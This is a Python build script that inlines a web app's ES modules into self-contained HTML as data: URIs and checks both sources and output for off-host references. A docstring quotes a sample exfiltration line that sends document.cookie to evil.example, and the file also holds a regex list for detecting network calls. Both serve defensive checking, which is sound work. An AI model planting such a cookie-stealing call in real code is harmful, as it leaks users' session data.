"""kit/arena_ui/build_ui.py — THE INLINER.

COLOSSEUM — turns the dev-time sources (`spar.src.html`, and
`projector.src.html` once a collaborator ships it) into fully self-contained
`spar.html` / `projector.html`: every `core/*.js` ES module the page imports
is read, its own local imports are resolved and inlined first (depth-first,
memoized), and the result is embedded as a `data:` URI so the page's own
`import ... from './core/x.js'` statements become
`import ... from 'data:text/javascript;base64,...'` — real ES module
semantics (live bindings, one module instance per page, `export`/`import`
untouched), zero bundler, zero build step beyond this one script.

Python 3.12 stdlib only (`base64`, `re`, `pathlib`) — CONTRACTS.md section 0.

Why `data:` URIs and not a hand-rolled scope-flattening bundler: the core/
modules already form a small, well-behaved import graph (every file but
`widgets.js` is a leaf; `widgets.js` has exactly one static import and one
dynamic `import()`, both of `theme.js`/`font.js` — see each core file's own
header). Rewriting *specifiers* to point at a `data:` URI of the already-
correct module source is a few lines and can never subtly break `export`
semantics the way concatenating five files into one shared scope could.
A `data:` URI is not a network fetch and has no host, so it can never trip
the "no src=, href=, or fetch() pointing off-host" gate below — that gate
exists to catch an import inlining MISSED, not to forbid this mechanism.

Usage:
    python3 -m kit.arena_ui.build_ui
    python3 kit/arena_ui/build_ui.py [--out-dir DIR]

Exit code is non-zero if spar.html could not be built or fails the
self-contained assertion. projector.src.html is optional — CONTRACTS.md
section 10 and this task's own brief both say a collaborator owns it, so its
absence is logged and skipped, never a build failure; the workspace-wide
"catch ImportError, log, continue" rule (day26 task brief, rule 2) applies
here as "catch FileNotFoundError, log, continue" for that one file.
"""

from __future__ import annotations

import argparse
import base64
import re
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent

# A relative ES module specifier: './x.js', '../y/z.js' — never a bare
# specifier ('theme.js' with no leading dot, which is not legal ESM syntax
# for a relative import anyway) and never something already inlined
# ('data:...'). Matches both the quote characters so the replacement can put
# the same quote style back.
#
# Anchored to `^[ \t]*import` (MULTILINE) — a REAL import/dynamic-import is
# always the first non-whitespace token on its own line in this codebase
# (top-level `import {...} from '...'` statements, and widgets.js's own
# indented-but-line-initial `import('./font.js')`). This is deliberate, not
# an accident of these six files: every core/*.js header comment discusses
# its own import surface in prose, and theme.js's header goes as far as
# spelling out a literal, quoted example —
# `// import { COLORS, SIZES, TIMINGS, FONT } from "./core/theme.js"` —
# which an unanchored regex matches as if it were a real statement and
# "resolves" relative to theme.js's own directory, doubling the path into
# a nonexistent core/core/theme.js (caught empirically while first running
# this build). Anchoring to real line-initial `import` is far more precise
# than trying to strip comments generically (which risks mangling a string
# literal that happens to contain `//`), and it costs nothing here since
# these files never write a real import anywhere but line-initial.
_STATIC_IMPORT_RE = re.compile(
    r"""^(?P<lead>[ \t]*)(?P<stmt>import\s(?:[^'";]*?\sfrom\s)?)(?P<q>['"])(?P<spec>\.\.?/[^'"]+)(?P=q)""",
    re.MULTILINE,
)
_DYNAMIC_IMPORT_RE = re.compile(
    r"""^(?P<lead>[ \t]*)(?P<stmt>import\()\s*(?P<q>['"])(?P<spec>\.\.?/[^'"]+)(?P=q)\s*\)""",
    re.MULTILINE,
)

_MODULE_SCRIPT_RE = re.compile(
    r"""<script\b(?P<attrs>[^>]*\btype\s*=\s*["']module["'][^>]*)>(?P<body>.*?)</script\s*>""",
    re.IGNORECASE | re.DOTALL,
)
_SRC_ATTR_RE = re.compile(r"""\bsrc\s*=\s*(['"])(?P<src>.*?)\1""", re.IGNORECASE)


class BuildError(Exception):
    """A real defect in the source being inlined — never swallowed."""


def _to_data_uri(js_source: str) -> str:
    encoded = base64.b64encode(js_source.encode("utf-8")).decode("ascii")
    return f"data:text/javascript;charset=utf-8;base64,{encoded}"


def _rewrite_local_imports(
    js_source: str, module_path: Path, cache: dict[Path, str], visiting: frozenset[Path]
) -> str:
    """Replace every relative import/dynamic-import specifier in `js_source`
    (a module that lives at `module_path`) with the `data:` URI of the
    already-inlined target module, resolving and inlining that target first
    if it has not been seen yet. `cache` is shared across the whole build so
    a module imported from two different places is only read/encoded once.
    `visiting` is the chain of modules currently being inlined (this
    module's own ancestors), threaded through purely for cycle detection."""

    def resolve_and_inline(spec: str) -> str:
        target = (module_path.parent / spec).resolve()
        return _inline_module(target, cache, visiting)

    def sub_static(m: re.Match) -> str:
        uri = resolve_and_inline(m.group("spec"))
        return f"{m.group('lead')}{m.group('stmt')}{m.group('q')}{uri}{m.group('q')}"

    def sub_dynamic(m: re.Match) -> str:
        uri = resolve_and_inline(m.group("spec"))
        return f"{m.group('lead')}{m.group('stmt')}{m.group('q')}{uri}{m.group('q')})"

    js_source = _STATIC_IMPORT_RE.sub(sub_static, js_source)
    js_source = _DYNAMIC_IMPORT_RE.sub(sub_dynamic, js_source)
    return js_source


def _inline_module(path: Path, cache: dict[Path, str], visiting: frozenset[Path] = frozenset()) -> str:
    """Return a `data:` URI for the module at `path`, with every one of its
    own local imports already rewritten to `data:` URIs. Memoized in
    `cache`. Raises BuildError on a missing file or an import cycle (the
    core/ modules are documented as forming a DAG — a cycle here is a real
    authoring bug, not something to paper over)."""
    if path in cache:
        return cache[path]
    if path in visiting:
        cycle = " -> ".join(p.name for p in (*visiting, path))
        raise BuildError(f"import cycle while inlining core modules: {cycle}")
    if not path.is_file():
        raise BuildError(f"imported module not found: {path}")

    src = path.read_text(encoding="utf-8")
    rewritten = _rewrite_local_imports(src, path, cache, visiting | {path})
    uri = _to_data_uri(rewritten)
    cache[path] = uri
    return uri


def _inline_module_source(path: Path, cache: dict[Path, str], visiting: frozenset[Path]) -> str:
    """Like _inline_module but returns the REWRITTEN SOURCE TEXT (not a data
    URI) — used for the page's own top-level <script type="module"> body,
    which stays inline rather than being data-URI'd itself."""
    src = path.read_text(encoding="utf-8")
    return _rewrite_local_imports(src, path, cache, visiting | {path})


def _inline_script_block(attrs: str, body: str, html_path: Path, cache: dict[Path, str]) -> str:
    """Turn one `<script type="module" ...>` block into a fully self-
    contained one. Two shapes, both handled:

      (a) `<script type="module">  ...inline JS with import statements...
          </script>` — the common case, used by spar.src.html: rewrite the
          body's own local import specifiers to data: URIs and leave it
          inline.

      (b) `<script type="module" src="./core/x.js"></script>` — a page that
          imports a core module via a separate tag rather than a bare
          `import` statement inside its own logic. Read that file, inline
          ITS local imports the same way, and splice the result in as the
          tag's new body (dropping `src=` — CONTRACTS forbids any external
          reference in the shipped artifact regardless of authoring style).
    """
    src_match = _SRC_ATTR_RE.search(attrs)
    if src_match:
        target = (html_path.parent / src_match.group("src")).resolve()
        if not target.is_file():
            raise BuildError(f"{html_path.name}: <script type=module src=...> not found: {target}")
        new_body = _inline_module_source(target, cache, frozenset())
        new_attrs = _SRC_ATTR_RE.sub("", attrs).strip()
        new_attrs = f" {new_attrs}" if new_attrs else ""
        return f"<script{new_attrs}>{new_body}</script>"

    new_body = _rewrite_local_imports(body, html_path, cache, frozenset({html_path}))
    return f"<script{attrs}>{new_body}</script>"


def inline_page(html_path: Path) -> str:
    """Read `html_path` and return its content with every module script's
    local imports resolved to `data:` URIs. Raises BuildError on any
    unresolvable import or missing file — a page that fails to inline is a
    real defect, never silently shipped half-built."""
    html = html_path.read_text(encoding="utf-8")
    cache: dict[Path, str] = {}

    def sub_block(m: re.Match) -> str:
        return _inline_script_block(m.group("attrs"), m.group("body"), html_path, cache)

    out = _MODULE_SCRIPT_RE.sub(sub_block, html)
    return out


# ---------------------------------------------------------------------------
# the self-contained assertion — "no src=, href= or fetch() pointing
# off-host, and FAIL if it does" (this task's own brief)
# ---------------------------------------------------------------------------

_TAG_REF_RE = re.compile(
    r"""<(?P<tag>script|link|img|iframe|source|embed|object)\b[^>]*?\b(?P<attr>src|href)\s*=\s*(['"])(?P<val>.*?)\3""",
    re.IGNORECASE | re.DOTALL,
)
_FETCH_OFFHOST_RE = re.compile(
    r"""fetch\(\s*['"](?:https?:)?//""", re.IGNORECASE
)
_LEFTOVER_IMPORT_RE = re.compile(
    r"""(?:from\s+['"]\.\.?/|import\(\s*['"]\.\.?/)"""
)


# Every way a source file can reach off-host. Checked on the RAW SOURCES, before inlining.
_SOURCE_OFFHOST_RES = (
    ("fetch off-host",   re.compile(r"""fetch\(\s*['"`](?:https?:)?//""", re.I)),
    ("XMLHttpRequest",   re.compile(r"""\bnew\s+XMLHttpRequest\b""")),
    ("WebSocket",        re.compile(r"""\bnew\s+WebSocket\b""")),
    ("EventSource",      re.compile(r"""\bnew\s+EventSource\b""")),
    ("importScripts",    re.compile(r"""\bimportScripts\s*\(""")),
    ("dynamic import",   re.compile(r"""\bimport\(\s*['"`](?:https?:)?//""", re.I)),
    ("css @import",      re.compile(r"""@import\s+(?:url\()?\s*['"]?(?:https?:)?//""", re.I)),
    ("css url()",        re.compile(r"""url\(\s*['"]?(?:https?:)?//""", re.I)),
    ("absolute src",     re.compile(r"""\bsrc\s*=\s*['"](?:https?:)?//""", re.I)),
)


def assert_sources_clean(sources: dict[str, str]) -> None:
    """Scan the RAW module sources for off-host references, before they are inlined.

    THIS IS THE GATE THAT ACTUALLY WORKS, and it exists because the other one does not.

    `assert_self_contained` runs on the finished HTML, where every module has already become
    a `data:text/javascript;base64,...` URI. Base64 is opaque to a regex, so that gate cannot
    see inside the very files it just inlined. A verifier proved the hole by injecting

        fetch('https://evil.example/exfil?k=' + document.cookie)

    into `core/theme.js`, rebuilding, and watching the build report "self-contained: PASS"
    with the call live in the shipped page.

    The published artifact is a strict-CSP page students and an instructor open on a laptop
    that holds sealed decks. A build gate that passes a page phoning home is worse than no
    gate, because it is trusted. So: check the sources, where the text is still readable.
    """
    problems: list[str] = []
    for name, source in sorted(sources.items()):
        for label, pattern in _SOURCE_OFFHOST_RES:
            for m in pattern.finditer(source):
                line = source.count("\n", 0, m.start()) + 1
                snippet = source[m.start():m.start() + 70].replace("\n", " ")
                problems.append(f"{name}:{line}  [{label}]  {snippet!r}")
    if problems:
        joined = "\n  - ".join(problems)
        raise BuildError(
            "source files are not self-contained (checked BEFORE inlining):\n  - " + joined
        )


def assert_self_contained(html: str, label: str) -> None:
    """Raise BuildError with every offending reference listed if `html`
    still points off-host anywhere, or if an import was somehow left
    un-inlined (a build bug, not a legitimate external reference)."""
    problems: list[str] = []

    for m in _TAG_REF_RE.finditer(html):
        val = m.group("val")
        if val.startswith("data:") or val.startswith("blob:") or val == "":
            continue
        problems.append(f'<{m.group("tag")} {m.group("attr")}="{val}">')

    for m in _FETCH_OFFHOST_RE.finditer(html):
        start = m.start()
        problems.append(f"fetch(...) off-host: ...{html[start:start + 60]!r}...")

    for m in _LEFTOVER_IMPORT_RE.finditer(html):
        start = m.start()
        problems.append(f"un-inlined relative import left in output: ...{html[start:start + 60]!r}...")

    if problems:
        joined = "\n  - ".join(problems)
        raise BuildError(f"{label} is not self-contained:\n  - {joined}")


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def _collect_sources(src_path: Path) -> dict[str, str]:
    """Every raw source that will be inlined into `src_path`, keyed by a readable name.

    Deliberately broad: the .src.html itself plus every .js and .css under this directory
    tree. Walking the import graph would miss a file that a future page starts importing,
    and the cost of scanning a handful of small files is nil.
    """
    sources: dict[str, str] = {src_path.name: src_path.read_text(encoding="utf-8")}
    for path in sorted(HERE.rglob("*")):
        if path.suffix not in (".js", ".css") or not path.is_file():
            continue
        if "tests" in path.parts or "node_modules" in path.parts:
            continue
        sources[path.relative_to(HERE).as_posix()] = path.read_text(encoding="utf-8")
    return sources


def _build_one(src_path: Path, out_path: Path, label: str) -> int:
    # Sources FIRST — this is the gate that can actually see the code (see
    # assert_sources_clean). The HTML check below is a second line of defence for
    # references introduced by the inliner itself, not a substitute for this one.
    assert_sources_clean(_collect_sources(src_path))
    html = inline_page(src_path)
    assert_self_contained(html, label)
    out_path.write_text(html, encoding="utf-8")
    size = out_path.stat().st_size
    print(f"wrote {out_path} ({size:,} bytes) — self-contained: PASS (sources + output)")
    return size


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument(
        "--out-dir", type=Path, default=HERE,
        help="directory to write spar.html / projector.html into (default: kit/arena_ui/)",
    )
    args = ap.parse_args(argv)
    out_dir = args.out_dir
    out_dir.mkdir(parents=True, exist_ok=True)

    spar_src = HERE / "spar.src.html"
    if not spar_src.is_file():
        print(f"FATAL: {spar_src} not found — nothing to build", file=sys.stderr)
        return 1

    try:
        _build_one(spar_src, out_dir / "spar.html", "spar.html")
    except BuildError as exc:
        print(f"FATAL: {exc}", file=sys.stderr)
        return 1

    proj_src = HERE / "projector.src.html"
    if not proj_src.is_file():
        print(
            f"note: {proj_src.name} not found yet (a collaborator owns it) — "
            "skipping projector.html, spar.html still built.",
        )
    else:
        try:
            _build_one(proj_src, out_dir / "projector.html", "projector.html")
        except BuildError as exc:
            # Degrade gracefully (day26 task brief, rule 2): projector.html
            # is not this file's primary deliverable and a collaborator may
            # still be mid-edit. spar.html above already succeeded and was
            # written, so this is a warning, not a failed build.
            print(f"WARNING: projector.src.html present but failed to inline: {exc}", file=sys.stderr)

    return 0


if __name__ == "__main__":
    sys.exit(main())
